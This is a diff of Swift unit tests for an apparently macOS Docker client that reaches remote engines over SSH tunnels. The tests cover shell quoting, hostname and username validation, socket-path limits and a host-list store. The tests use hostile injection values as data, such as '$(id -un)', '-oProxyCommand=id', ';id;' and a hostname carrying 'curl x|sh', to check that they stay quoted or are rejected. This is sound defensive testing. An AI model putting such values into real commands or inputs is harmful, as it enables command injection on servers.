@@ -339,14 +339,43 @@ do {
                           portBindings: ["80/tcp": [.init(hostPort: "8080")],
                                          "53/udp": [.init(hostPort: "5353")]],
                           restartPolicy: .init(name: "unless-stopped")))
+    // `build` returns the SUBCOMMAND only. Naming the daemon — and deciding how many shells
+    // will re-parse the result — belongs to the caller, because those differ per target and
+    // getting the second one wrong is remote code execution (it happened, twice).
     equal(DockerRunCommand.build(from: inspect),
-          "docker run -d --name web -p 5353:53/udp -p 8080:80 -v pgdata:/data "
+          "run -d --name web -p 5353:53/udp -p 8080:80 -v pgdata:/data "
         + "-e A=plain -e 'B=has space' --restart unless-stopped -w /app "
         + "nginx:latest nginx -g 'daemon off;'",
           "full docker run reconstruction")
     equal(DockerRunCommand.quote("it's"), "'it'\\''s'", "single-quote escaping")
     let bare = ContainerInspect(name: "/x", config: .init(image: "alpine"), hostConfig: .init())
-    equal(DockerRunCommand.build(from: bare), "docker run -d --name x alpine", "minimal container")
+    equal(DockerRunCommand.build(from: bare), "run -d --name x alpine", "minimal container")
+
+    // The remote wrapper must quote the WHOLE body again. ssh joins its remote-command
+    // arguments with spaces and lets the server's shell re-parse them, so a body quoted once
+    // arrives unquoted — and container metadata comes from the daemon, a machine the user may
+    // not control. A `$(...)` in an env var would otherwise execute ON THE SERVER when the
+    // copied command is pasted.
+    let hostile = ContainerInspect(
+        name: "/x",
+        config: .init(image: "alpine", env: ["FOO=$(id -un)"]),
+        hostConfig: .init())
+    let body = DockerRunCommand.build(from: hostile)
+    check(body.contains("'FOO=$(id -un)'"), "the env value is quoted once for the docker CLI")
+    let remote = SSHTunnel.sshCommand(running: "docker \(body)",
+                                      user: "deploy", hostname: "web1", port: 22)
+    equal(remote,
+          "ssh 'deploy@web1' 'docker run -d --name x -e '\\''FOO=$(id -un)'\\'' alpine'",
+          "…and the whole body is quoted a second time for the server's shell")
+    // Structural: everything after the destination is one quoted word.
+    check(remote.hasSuffix("'"), "the remote body closes its quoting")
+    check(!remote.contains("$(id -un) "), "no unquoted substitution reaches the remote shell")
+
+    // A TTY is requested only where one is needed.
+    check(SSHTunnel.sshCommand(running: "x", user: "u", hostname: "h", port: 22,
+                               tty: true).hasPrefix("ssh -t "), "tty:true adds -t")
+    check(SSHTunnel.sshCommand(running: "x", user: "u", hostname: "h", port: 2222)
+            .hasPrefix("ssh -p 2222 "), "a custom port is passed")
 }
 
 // MARK: DockerDates (RFC3339 + Go zero-time sentinel)
@@ -577,6 +606,506 @@ do {
                                                ws("b", "B", "/tmp/velox-y")]) }
     catch { threw = true }
     check(!threw, "distinct locations are accepted")
+}
+
+// MARK: Remote hosts (SSH-tunnelled engines)
+
+section("SystemInfo (/info)")
+do {
+    // The real payload shape, taken from a Debian 13 host running Docker 29.7.2.
+    let full = """
+    {"NCPU":4,"MemTotal":12432990208,"OperatingSystem":"Debian GNU/Linux 13 (trixie)",
+     "KernelVersion":"6.12.101+deb13-amd64","Architecture":"x86_64",
+     "ServerVersion":"29.7.2","Name":"mini","Swarm":{"NodeID":""}}
+    """
+    let info = try? JSONDecoder().decode(SystemInfo.self, from: Data(full.utf8))
+    equal(info?.cpus ?? -1, 4, "NCPU decodes")
+    equal(info?.memoryBytes ?? -1, 12_432_990_208, "MemTotal decodes")
+    equal(info?.architecture ?? "", "x86_64", "Architecture decodes")
+    equal(info?.serverVersion ?? "", "29.7.2", "ServerVersion decodes")
+    equal(info?.name ?? "", "mini", "Name decodes")
+    check(info?.operatingSystem?.hasPrefix("Debian") == true, "OperatingSystem decodes")
+    // `/info` is large and version-dependent; a document missing keys we ask for must
+    // still yield the fields it does carry rather than failing outright.
+    let sparse = try? JSONDecoder().decode(SystemInfo.self, from: Data("{\"NCPU\":2}".utf8))
+    equal(sparse?.cpus ?? -1, 2, "a sparse /info still decodes what it has")
+    check(sparse?.memoryBytes == nil, "…and leaves the rest nil rather than throwing")
+    check((try? JSONDecoder().decode(SystemInfo.self, from: Data("{}".utf8))) != nil,
+          "an empty /info decodes to all-nil, not an error")
+
+    // MemTotal is kernel-usable RAM, not installed RAM: firmware and the kernel image are
+    // already subtracted, so a 12 GiB box reports ~11.58 (measured on a real host). We
+    // report that honestly rather than rounding to a figure no source gave us — the API
+    // cannot tell us the installed size at all.
+    equal(info?.memoryDescription ?? "", "11.6 GB", "kernel-usable RAM is reported as measured")
+    equal(SystemInfo(cpus: nil, memoryBytes: 16 << 30).memoryDescription ?? "",
+          "16 GB", "an exact 16 GiB drops the trailing .0")
+    equal(SystemInfo(cpus: nil, memoryBytes: 67_205_476_352).memoryDescription ?? "",
+          "62.6 GB", "a large host is not rounded up to 64 either")
+    check(SystemInfo(cpus: nil, memoryBytes: nil).memoryDescription == nil,
+          "unknown memory yields nil rather than \"0 GB\"")
+    check(SystemInfo(cpus: nil, memoryBytes: 0).memoryDescription == nil,
+          "zero memory yields nil too")
+}
+
+section("UnixSocketAddress")
+do {
+    // Four call sites used to build this by hand and had already drifted (the rebind
+    // capacity argument differed between copies). One helper, pinned here.
+    equal(UnixSocketAddress.pathCapacity, 104, "sun_path is 104 bytes on Darwin")
+    check(UnixSocketAddress.canRepresent("/tmp/x.sock"), "an ordinary path fits")
+    check(UnixSocketAddress.canRepresent(String(repeating: "a", count: 103)),
+          "103 bytes fits (leaving room for the NUL)")
+    check(!UnixSocketAddress.canRepresent(String(repeating: "a", count: 104)),
+          "104 bytes does not fit")
+
+    // The body must not run at all for an unrepresentable path — a caller that mapped the
+    // nil to its own error would otherwise have already issued a syscall on a junk address.
+    var ran = false
+    let over = UnixSocketAddress.withSockaddr(path: String(repeating: "b", count: 200)) { _, _ -> Int in
+        ran = true; return 0
+    }
+    check(over == nil, "an over-long path returns nil")
+    check(!ran, "…without invoking the body")
+
+    // The address really is AF_UNIX with the path NUL-terminated in place.
+    let observed: (family: Int, path: String, len: Int)? =
+        UnixSocketAddress.withSockaddr(path: "/tmp/velox-addr.sock") { ptr, len in
+            ptr.withMemoryRebound(to: sockaddr_un.self, capacity: 1) { un in
+                var copy = un.pointee
+                let path = withUnsafeBytes(of: &copy.sun_path) { raw -> String in
+                    String(cString: raw.baseAddress!.assumingMemoryBound(to: CChar.self))
+                }
+                return (Int(copy.sun_family), path, Int(len))
+            }
+        }
+    equal(observed?.family ?? -1, Int(AF_UNIX), "sun_family is AF_UNIX")
+    equal(observed?.path ?? "", "/tmp/velox-addr.sock", "the path round-trips NUL-terminated")
+    equal(observed?.len ?? -1, MemoryLayout<sockaddr_un>.size, "the length is sizeof(sockaddr_un)")
+
+    // An empty path is representable (an autobind-style address); it must not trap.
+    check(UnixSocketAddress.withSockaddr(path: "") { _, _ in true } == true,
+          "an empty path is handled without trapping")
+}
+
+section("RemoteHost")
+do {
+    let host = RemoteHost(id: "abcd1234", name: "prod", user: "deploy", hostname: "web1.example.com")
+    equal(host.sshDestination, "deploy@web1.example.com", "ssh destination is user@host")
+    equal(host.port, 22, "default ssh port")
+    equal(host.socketPath, "/var/run/docker.sock", "default remote socket")
+    check(host.localSocketURL.path.hasSuffix("hosts/abcd1234.sock"),
+          "the forwarded socket is derived from the id alone")
+    equal(host.subtitle, "deploy@web1.example.com", "subtitle hides defaults")
+
+    let odd = RemoteHost(id: "ef01", name: "nas", user: "root", hostname: "nas.lan",
+                         port: 2222, socketPath: "/run/docker.sock")
+    equal(odd.subtitle, "root@nas.lan:2222 · /run/docker.sock", "subtitle shows non-defaults")
+
+    // The id lands inside sockaddr_un.sun_path (104 bytes) — keep it short.
+    check(RemoteHost.newID().count == 8, "generated ids are 8 hex characters")
+    check(host.localSocketURL.path.utf8.count < 104, "a forwarded socket path fits in sun_path")
+
+    equal(RemoteHost.clampPort(0), 1, "port clamps up")
+    equal(RemoteHost.clampPort(99999), 65535, "port clamps down")
+
+    check(host.deleteConfirmationMatches(" PROD "), "delete confirmation is trimmed + case-insensitive")
+    check(!host.deleteConfirmationMatches("prod2"), "a near-miss does not confirm a delete")
+}
+
+section("RemoteHost.validate")
+do {
+    check(RemoteHost.validate(name: "  ") != nil, "blank name rejected")
+    check(RemoteHost.validate(name: "prod") == nil, "ordinary name accepted")
+    check(RemoteHost.validate(user: "de ploy") != nil, "a space in the username is rejected")
+    check(RemoteHost.validate(user: "root@x") != nil, "an @ in the username is rejected")
+    check(RemoteHost.validate(user: "deploy") == nil, "ordinary username accepted")
+    // A hostname is interpolated into an ssh argument and an AppleScript command; anything
+    // that could change their meaning must never reach either.
+    check(RemoteHost.validate(hostname: "a b") != nil, "a space in the hostname is rejected")
+    check(RemoteHost.validate(hostname: "u@h") != nil, "an @ in the hostname is rejected")
+    // A pasted "host:port" is the common mistake, and it must be named — swallowed into
+    // the ssh destination it fails with a baffling resolver error instead.
+    let portInHost = RemoteHost.validate(hostname: "h:22")
+    check(portInHost != nil, "a pasted host:port is rejected")
+    check(portInHost?.contains("Port field") == true, "…naming the actual mistake")
+    // But a colon is legitimate in an IPv6 literal, which ssh accepts as user@2001:db8::1.
+    check(RemoteHost.validate(hostname: "2001:db8::1") == nil, "an IPv6 literal is accepted")
+    check(RemoteHost.validate(hostname: "::1") == nil, "IPv6 loopback is accepted")
+    check(RemoteHost.isIPv6Literal("2001:db8::1"), "IPv6 detection is the resolver, not a guess")
+    check(!RemoteHost.isIPv6Literal("h:22"), "…so host:port is not mistaken for IPv6")
+    check(!RemoteHost.isIPv6Literal("192.168.5.4"), "…nor is IPv4")
+    // Unbracketed, `http://fe80::1:8080/` is unparseable: the address's colons collide
+    // with the URL port separator.
+    equal(RemoteHost.urlHost("2001:db8::1"), "[2001:db8::1]", "IPv6 is bracketed for URLs")
+    equal(RemoteHost.urlHost("192.168.5.4"), "192.168.5.4", "IPv4 is left alone")
+    equal(RemoteHost(name: "v6", user: "root", hostname: "2001:db8::1", port: 2222).subtitle,
+          "root@[2001:db8::1]:2222", "an IPv6 subtitle stays readable next to a port")
+    check(RemoteHost.validate(hostname: "web1.example.com") == nil, "a plain hostname is accepted")
+    check(RemoteHost.validate(hostname: "10.0.0.4") == nil, "an IP address is accepted")
+    check(RemoteHost.validate(socketPath: "run/docker.sock") != nil, "a relative socket path is rejected")
+    check(RemoteHost.validate(socketPath: "/var/run/docker.sock") == nil, "an absolute socket path is accepted")
+    // The socket path is concatenated into ssh's colon-delimited `-L <local>:<remote>`
+    // spec, so a colon would silently change what ssh parses.
+    check(RemoteHost.validate(socketPath: "/var/run/docker.sock:2375") != nil,
+          "a colon in the socket path is rejected")
+}
+
+section("RemoteHost hostile input")
+do {
+    // A pasted multi-line value survived `normalized` (which trims only the ends) and then
+    // silently broke every Terminal hand-off: an AppleScript string literal cannot span
+    // lines, so osascript failed to compile and the button just did nothing.
+    check(RemoteHost.validate(hostname: "web1\nevil") != nil, "an embedded newline is rejected")
+    check(RemoteHost.validate(hostname: "web1\tevil") != nil, "a tab is rejected")
+    check(RemoteHost.validate(user: "de\nploy") != nil, "…in the username too")
+    check(RemoteHost.hasBlankOrControl("a\u{7}b"), "control characters are caught")
+    check(!RemoteHost.hasBlankOrControl("web1.example.com"), "an ordinary hostname is clean")
+
+    // A leading dash makes ssh read the value as an OPTION rather than a destination, and
+    // `-oProxyCommand=…` is executed through /bin/sh.
+    check(RemoteHost.validate(hostname: "-oProxyCommand=id") != nil, "an option-shaped host is rejected")
+    check(RemoteHost.validate(user: "-oProxyCommand=id") != nil, "…and an option-shaped user")
+    check(RemoteHost.validate(socketPath: "/var/run/docker sock") != nil,
+          "whitespace in the socket path is rejected")
+
+    // A hand-edited hosts.json never passes field validation, so the spawn path re-checks
+    // the values that change what ssh does.
+    let sneaky = RemoteHost(id: "aabbccdd", name: "x", user: "-oProxyCommand=id", hostname: "h")
+    check(SSHTunnel.spawnComplaint(for: sneaky) != nil, "spawn refuses an option-shaped user")
+    let newline = RemoteHost(id: "aabbccde", name: "x", user: "u", hostname: "h\nevil")
+    check(SSHTunnel.spawnComplaint(for: newline) != nil, "spawn refuses an embedded newline")
+    let fine = RemoteHost(id: "aabbccdf", name: "x", user: "mikael", hostname: "192.168.5.4")
+    check(SSHTunnel.spawnComplaint(for: fine) == nil, "an ordinary host spawns")
+
+    // `-L` is a LOCAL forward, so ExitOnForwardFailure only covers our own listener. A
+    // server that refuses the channel leaves ssh alive forever — detected from stderr.
+    check(SSHTunnel.isForwardRefusal("channel 0: open failed: administratively prohibited"),
+          "a refused forward is recognised")
+    check(SSHTunnel.isForwardRefusal("channel 2: open failed: connect failed: No such file"),
+          "…including a missing remote socket")
+    check(!SSHTunnel.isForwardRefusal("Permission denied (publickey)."),
+          "an auth failure is not mistaken for one")
+}
+
+section("SSHTunnel.arguments")
+do {
+    let host = RemoteHost(id: "abcd1234", name: "prod", user: "deploy", hostname: "web1.example.com")
+    let args = SSHTunnel.arguments(for: host)
+
+    check(args.contains("-N"), "no remote command — the connection only carries the forward")
+    // BatchMode is load-bearing: Velox has no way to render an ssh password prompt, so
+    // without it a host needing one hangs invisibly instead of failing with a message.
+    check(args.contains("BatchMode=yes"), "ssh never prompts")
+    check(args.contains("ExitOnForwardFailure=yes"), "a failed forward exits instead of looking connected")
+    check(args.contains("ServerAliveInterval=15"), "a dropped link is noticed")
+    equal(args.last ?? "", "deploy@web1.example.com", "the destination is the final argument")
+
+    guard let l = args.firstIndex(of: "-L") else { check(false, "-L present"); exit(1) }
+    equal(args[l + 1], "\(host.localSocketURL.path):/var/run/docker.sock",
+          "forwards the local socket to the remote docker socket")
+    check(!args.contains("-p"), "the default ssh port is not passed explicitly")
+    check(!args.contains("-i"), "no identity file unless one was configured")
+
+    let custom = RemoteHost(id: "ef01", name: "nas", user: "root", hostname: "nas.lan",
+                            port: 2222, socketPath: "/run/docker.sock",
+                            identityFile: "~/.ssh/nas_ed25519")
+    let customArgs = SSHTunnel.arguments(for: custom)
+    guard let p = customArgs.firstIndex(of: "-p"), let i = customArgs.firstIndex(of: "-i"),
+          let cl = customArgs.firstIndex(of: "-L") else { check(false, "-p/-i/-L present"); exit(1) }
+    equal(customArgs[p + 1], "2222", "a non-default port is passed")
+    check(!customArgs[i + 1].hasPrefix("~"), "the identity path is tilde-expanded for ssh")
+    // Ordering matters: options must precede the destination, which ssh requires last.
+    check(customArgs.firstIndex(of: "-p")! < customArgs.count - 1, "-p precedes the destination")
+    equal(customArgs.last ?? "", "root@nas.lan", "the destination is still last with a custom port")
+    check(customArgs[cl + 1].hasSuffix(":/run/docker.sock"), "a non-default remote socket is honoured")
+}
+
+section("SSHTunnel.socketPathComplaint")
+do {
+    // Measured against OpenSSH 10.3 on 2026-09-01: a `-L` unix-socket path of 103 bytes
+    // forwards fine, 104 dies instantly with "Bad local forwarding specification" — the
+    // `sockaddr_un.sun_path` bound. Without this guard the redial loop repeats that
+    // cryptic failure forever; with it the tunnel fails once, clearly, and stops.
+    let fm = FileManager.default
+    let sandbox = fm.temporaryDirectory.appendingPathComponent("velox-sunpath-\(getpid())")
+    setenv("VELOX_HOME", sandbox.path, 1)
+    defer { unsetenv("VELOX_HOME") }
+
+    let ok = RemoteHost(id: "aabbccdd", name: "n", user: "u", hostname: "h")
+    check(SSHTunnel.socketPathComplaint(for: ok) == nil || ok.localSocketURL.path.utf8.count >= 104,
+          "a normal ~/.velox/hosts path is accepted")
+
+    // Force the boundary exactly. `<VELOX_HOME>/hosts/aabbccdd.sock` adds a fixed 20
+    // bytes, so the home directory carries the rest. Computed from a constant rather than
+    // by measuring the current path, which would drift as each call rewrites VELOX_HOME.
+    func hostWithPathLength(_ target: Int) -> RemoteHost? {
+        let suffix = "/hosts/aabbccdd.sock".utf8.count      // 20
+        let homeLength = target - suffix
+        guard homeLength > 5 else { return nil }
+        setenv("VELOX_HOME", "/tmp/" + String(repeating: "a", count: homeLength - 5), 1)
+        return RemoteHost(id: "aabbccdd", name: "n", user: "u", hostname: "h")
+    }
+    if let h103 = hostWithPathLength(103) {
+        equal(h103.localSocketURL.path.utf8.count, 103, "boundary host path is 103 bytes")
+        check(SSHTunnel.socketPathComplaint(for: h103) == nil, "103 bytes is accepted (ssh forwards it)")
+    }
+    if let h104 = hostWithPathLength(104) {
+        equal(h104.localSocketURL.path.utf8.count, 104, "boundary host path is 104 bytes")
+        let complaint = SSHTunnel.socketPathComplaint(for: h104)
+        check(complaint != nil, "104 bytes is refused before ssh is ever spawned")
+        check(complaint?.contains("VELOX_HOME") == true, "…and the message says how to fix it")
+    }
+}
+
+section("SSHTunnel terminal commands")
+do {
+    let shell = SSHTunnel.terminalShellCommand(containerID: "abc123", user: "deploy",
+                                               hostname: "web1", port: 22)
+    equal(shell,
+          "ssh -t 'deploy@web1' 'docker exec -it '\\''abc123'\\'' sh -c "
+          + "'\\''command -v bash >/dev/null && exec bash || exec sh'\\'''",
+          "both quoting levels are present")
+
+    // Level 1 — the remote command must reach the server as ONE word. ssh joins its
+    // remote-command arguments with spaces and lets the far shell re-parse them, so
+    // unquoted, `exec bash` runs on the SERVER and the user gets a host shell that looks
+    // like a container shell. (Measured against a real host before this was fixed.)
+    check(shell.contains("exec bash"), "the bash/sh fallback survives quoting")
+    guard let firstQuote = shell.firstIndex(of: "'") else { check(false, "quoted"); exit(1) }
+    check(!shell[..<firstQuote].contains("exec"), "nothing executable precedes the quoting")
+
+    // Level 2 — values that reach a shell must not be able to leave their quotes. A
+    // container id comes from the DAEMON (a machine the user may not control) and a
+    // hostname survives a hand-edited hosts.json, which never passes field validation.
+    let hostileID = SSHTunnel.terminalShellCommand(containerID: "a\";id;\"b", user: "u",
+                                                   hostname: "h", port: 22)
+    check(hostileID.contains("'a\";id;\"b'"), "the id stays inside one quoted argument")
+    // A double quote is inert inside single quotes; the character that could actually
+    // close the argument is a single quote, so that is what must be escaped.
+    let quoteInID = SSHTunnel.terminalShellCommand(containerID: "a'; id; '", user: "u",
+                                                   hostname: "h", port: 22)
+    check(quoteInID.contains("'\\''"),
+          "a single quote in a container id is escaped, not left to close the argument")
+    check(!quoteInID.contains("; id; ") || quoteInID.contains("'\\''; id; "),
+          "…so an injected command cannot reach the shell unquoted")
+
+    let hostileHost = SSHTunnel.terminalLoginCommand(user: "u", hostname: "h;curl x|sh", port: 22)
+    equal(hostileHost, "ssh 'u@h;curl x|sh'", "a hostile hostname stays one quoted argument")
+
+    // The classic POSIX escape: close, escaped quote, reopen.
+    equal(SSHTunnel.shellQuoted("it's"), "'it'\\''s'", "embedded single quotes are escaped")
+    equal(SSHTunnel.shellQuoted("plain"), "'plain'", "ordinary values are simply quoted")
+
+    let custom = SSHTunnel.terminalShellCommand(containerID: "abc123", user: "root",
+                                                hostname: "nas.lan", port: 2222)
+    check(custom.hasPrefix("ssh -t -p 2222 'root@nas.lan' "), "a non-default port is passed")
+
+    equal(SSHTunnel.terminalLoginCommand(user: "deploy", hostname: "web1", port: 22),
+          "ssh 'deploy@web1'", "a plain login omits -p at the default port")
+    equal(SSHTunnel.terminalLoginCommand(user: "root", hostname: "nas.lan", port: 2222),
+          "ssh -p 2222 'root@nas.lan'", "…and passes a custom one")
+}
+
+section("SSHTunnel supervision is globally serialised")
+do {
+    // Two tunnels for the same host share one forwarded socket path, so their start/stop
+    // work MUST be ordered against each other. Per-instance queues let `disconnect()`
+    // immediately followed by `select()` interleave, and the old tunnel's cleanup could
+    // unlink the new tunnel's live socket — leaving an ssh that never exits and a pane
+    // stuck on "Connecting…" with no redial. Same host id => same socket path is the
+    // property that makes the shared queue necessary.
+    let a = RemoteHost(id: "same0001", name: "a", user: "u", hostname: "h")
+    let b = RemoteHost(id: "same0001", name: "b", user: "u", hostname: "h")
+    equal(a.localSocketURL.path, b.localSocketURL.path,
+          "two hosts with one id resolve to the same socket path")
+    // Draining must be safe to call when nothing is running.
+    SSHTunnel.drainPendingWork()
+    check(true, "drainPendingWork() is safe with no tunnels running")
+}
+
+section("SSHTunnel.explain")
+do {
+    // These three are the failures that actually happen, and none is guessable from a
+    // spinner — each is fixed on the server or in ~/.ssh, not in Velox.
+    let key = SSHTunnel.explain(diagnostics: ["Host key verification failed."], status: 255,
+                                destination: "deploy@web1")
+    check(key.contains("ssh deploy@web1"), "an unverified host key tells you the exact command to run")
+
+    let auth = SSHTunnel.explain(diagnostics: ["deploy@web1: Permission denied (publickey)."],
+                                 status: 255, destination: "deploy@web1")
+    check(auth.lowercased().contains("password"), "an auth failure says Velox never prompts for a password")
+
+    let forward = SSHTunnel.explain(diagnostics: ["channel 0: open failed: administratively prohibited"],
+                                    status: 255, destination: "deploy@web1")
+    check(forward.contains("docker"), "a refused forward points at docker-group membership")
+
+    // A tunnel killed from outside (pkill, sleep/wake teardown, an agent restart) exits
+    // via a signal with no diagnostic, which Foundation reports as status 0 — so without
+    // the `killed` branch the user is told "ssh exited with status 0", which is nonsense.
+    let signalled = SSHTunnel.explain(diagnostics: [], status: 0,
+                                      destination: "deploy@web1", killed: true)
+    check(!signalled.contains("status 0"), "a signalled tunnel does not report \"status 0\"")
+    check(signalled.lowercased().contains("closed"), "…it says the connection was closed")
+
+    let unknown = SSHTunnel.explain(diagnostics: ["something unusual"], status: 3,
+                                    destination: "deploy@web1")
+    equal(unknown, "something unusual", "an unrecognised diagnostic passes through verbatim")
+    equal(SSHTunnel.explain(diagnostics: [], status: 7, destination: "x"),
+          "ssh exited with status 7.", "no diagnostics falls back to the exit status")
+}
+
+section("UnixSocketConnector")
+do {
+    let fm = FileManager.default
+    let base = fm.temporaryDirectory.appendingPathComponent("velox-sock-\(getpid())")
+    try? fm.createDirectory(at: base, withIntermediateDirectories: true)
+    defer { try? fm.removeItem(at: base) }
+
+    // Nothing listening — the common case while a tunnel is still coming up. It must fail
+    // fast rather than hang, because DockerResourceStore retries on a 1s loop.
+    let missing = base.appendingPathComponent("absent.sock")
+    var failed = false
+    if case .failure = UnixSocketConnector.connectSync(to: missing.path) { failed = true }
+    check(failed, "connecting to a socket nobody is serving fails")
+
+    // sun_path is 104 bytes; a path that cannot be represented must say so, not silently
+    // connect to a truncated one.
+    let tooLong = "/tmp/" + String(repeating: "x", count: 200) + ".sock"
+    failed = false
+    if case .failure = UnixSocketConnector.connectSync(to: tooLong) { failed = true }
+    check(failed, "an over-long socket path is rejected rather than truncated")
+
+    // A real listener: the fd it returns must be an ordinary socket that HTTPCodec can
+    // drive, which is the entire premise of reaching a remote daemon this way.
+    let live = base.appendingPathComponent("live.sock")
+    let listener = socket(AF_UNIX, SOCK_STREAM, 0)
+    check(listener >= 0, "test listener socket created")
+    var addr = sockaddr_un()
+    addr.sun_family = sa_family_t(AF_UNIX)
+    let pathBytes = Array(live.path.utf8)
+    withUnsafeMutableBytes(of: &addr.sun_path) { raw in
+        raw.copyBytes(from: pathBytes)
+        raw[pathBytes.count] = 0
+    }
+    let size = socklen_t(MemoryLayout<sockaddr_un>.size)
+    let bound = withUnsafePointer(to: &addr) { ptr in
+        ptr.withMemoryRebound(to: sockaddr.self, capacity: 1) { Darwin.bind(listener, $0, size) }
+    }
+    equal(bound, 0, "test listener bound")
+    equal(listen(listener, 4), 0, "test listener listening")
+
+    // Serve one canned HTTP response, so the exchange goes through the real codec.
+    let server = Thread {
+        let client = accept(listener, nil, nil)
+        guard client >= 0 else { return }
+        let body = "[{\"Id\":\"abc\"}]"
+        let response = "HTTP/1.1 200 OK\r\nContent-Length: \(body.utf8.count)\r\n\r\n" + body
+        _ = Array(response.utf8).withUnsafeBytes { write(client, $0.baseAddress, $0.count) }
+        close(client)
+    }
+    server.start()
+
+    switch UnixSocketConnector.connectSync(to: live.path) {
+    case .failure(let error):
+        check(false, "connecting to a live socket succeeds (\(error))")
+    case .success(let fd):
+        check(fd >= 0, "connecting to a live socket yields an fd")
+        let request = HTTPCodec.request(method: "GET", path: "/v1.47/containers/json")
+        _ = request.withUnsafeBytes { write(fd, $0.baseAddress, $0.count) }
+        let (status, payload) = (try? HTTPCodec.readResponse(fd: fd)) ?? (0, Data())
+        equal(status, 200, "HTTPCodec drives a unix-socket fd unchanged")
+        equal(String(decoding: payload, as: UTF8.self), "[{\"Id\":\"abc\"}]",
+              "…and reads the body back intact")
+        close(fd)
+    }
+    close(listener)
+}
+
+section("RemoteHostStore (sandboxed VELOX_HOME)")
+do {
+    let fm = FileManager.default
+    let sandbox = fm.temporaryDirectory.appendingPathComponent("velox-hosts-\(getpid())")
+    try? fm.createDirectory(at: sandbox, withIntermediateDirectories: true)
+    setenv("VELOX_HOME", sandbox.path, 1)
+    defer { unsetenv("VELOX_HOME"); try? fm.removeItem(at: sandbox) }
+
+    // No file yet. Unlike workspaces (where there is always at least one), having no
+    // remote host is the normal state and must not read as a fault.
+    let empty = (try? RemoteHostStore.load()) ?? RemoteHostManifest(hosts: [
+        RemoteHost(name: "sentinel", user: "u", hostname: "h")])
+    equal(empty.hosts.count, 0, "a missing hosts.json loads as an empty list")
+
+    let host = RemoteHost(id: "aa11", name: "prod", user: "deploy", hostname: "web1")
+    let after = try? RemoteHostStore.create(host)
+    equal(after?.hosts.count ?? -1, 1, "create adds a host")
+    equal(after?.revision ?? -1, 1, "…and bumps the revision")
+
+    let reloaded = try? RemoteHostStore.load()
+    equal(reloaded?.hosts.first?.name ?? "", "prod", "the manifest round-trips through disk")
+    equal(reloaded?.hosts.first?.sshDestination ?? "", "deploy@web1", "…with its connection details")
+
+    // Names are how a user tells two servers apart in the sidebar; duplicates must not be
+    // silently accepted.
+    var threw = false
+    do { _ = try RemoteHostStore.create(RemoteHost(id: "bb22", name: "PROD", user: "u", hostname: "h2")) }
+    catch { threw = true }
+    check(threw, "a duplicate name (case-insensitively) is refused")
+
+    _ = try? RemoteHostStore.rename(id: "aa11", to: "production")
+    equal((try? RemoteHostStore.load())?.hosts.first?.name ?? "", "production", "rename persists")
+
+    threw = false
+    do { _ = try RemoteHostStore.rename(id: "nope", to: "x") } catch { threw = true }
+    check(threw, "renaming a host that is gone fails loudly")
+
+    _ = try? RemoteHostStore.delete(id: "aa11")
+    equal((try? RemoteHostStore.load())?.hosts.count ?? -1, 0, "delete removes the host")
+
+    // A hand-edited (or downgrade-written) entry with a bad field must still be
+    // removable. Enforcing the per-field rules on every write would make the bad entry
+    // permanent: every mutation, including its own delete, would fail.
+    let wedged = RemoteHost(id: "cc33", name: "legacy", user: "u", hostname: "bad host:name")
+    try? RemoteHostStore.writeDurably(RemoteHostManifest(hosts: [wedged]))
+    equal((try? RemoteHostStore.load())?.hosts.count ?? -1, 1, "an entry with a bad field still loads")
+    _ = try? RemoteHostStore.create(RemoteHost(id: "dd44", name: "fresh", user: "u", hostname: "h"))
+    equal((try? RemoteHostStore.load())?.hosts.count ?? -1, 2, "…and does not block adding another host")
+    _ = try? RemoteHostStore.delete(id: "cc33")
+    equal((try? RemoteHostStore.load())?.hosts.count ?? -1, 1, "…and can itself be deleted")
+    _ = try? RemoteHostStore.delete(id: "dd44")
+
+    // But a host the user just described IS field-validated, so bad input never gets in.
+    threw = false
+    do { _ = try RemoteHostStore.create(RemoteHost(id: "ee55", name: "x", user: "u", hostname: "a b")) }
+    catch { threw = true }
+    check(threw, "a newly added host with a bad hostname is refused")
+
+    // A corrupt manifest must throw, not present an empty list: silently showing "no
+    // hosts" looks exactly like "you never configured any" while the real list sits
+    // unreadable on disk.
+    try? Data("{ not json".utf8).write(to: Paths.remoteHostManifest)
+    threw = false
+    do { _ = try RemoteHostStore.load() } catch { threw = true }
+    check(threw, "an unreadable hosts.json throws rather than reading as empty")
+
+    // …and because `mutate` starts with `load()`, a corrupt file fails EVERY mutation,
+    // including the delete that would remove the offending entry. Without a way out the
+    // host list is wedged with no GUI recourse.
+    threw = false
+    do { _ = try RemoteHostStore.delete(id: "anything") } catch { threw = true }
+    check(threw, "a corrupt manifest wedges even delete — hence the quarantine")
+
+    let quarantined = try? RemoteHostStore.quarantineCorruptManifest()
+    check(quarantined != nil, "quarantine moves the unreadable file aside")
+    check(quarantined.map { FileManager.default.fileExists(atPath: $0.path) } == true,
+          "…preserving it, so a hand-repair is still possible")
+    check(quarantined?.lastPathComponent.contains("corrupt-") == true,
+          "…under a name that says what it is")
+    check(!FileManager.default.fileExists(atPath: Paths.remoteHostManifest.path),
+          "…and leaves no manifest behind")
+    equal((try? RemoteHostStore.load())?.hosts.count ?? -1, 0, "the list loads clean afterwards")
+    _ = try? RemoteHostStore.create(RemoteHost(id: "ff66", name: "after", user: "u", hostname: "h"))
+    equal((try? RemoteHostStore.load())?.hosts.count ?? -1, 1, "…and is writable again")
 }
 
 section("Storage ext4 probes")
